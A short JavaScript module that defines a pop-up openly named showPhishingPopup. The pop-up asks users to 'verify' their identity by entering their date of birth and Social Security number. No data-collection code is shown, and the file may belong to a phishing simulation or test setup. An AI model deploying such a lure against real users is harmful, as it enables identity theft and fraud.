import { createPopup } from './popup_base.js';

export function showPhishingPopup() {
    createPopup({
        title: "Verify Your Identity",
        subtitle: "Please provide your DOB and SSN for verification.",
        fields: [
            { placeholder: "Enter your date of birth" },
            { placeholder: "Enter your SSN" }
        ],
        buttonText: "Verify"
    });
}
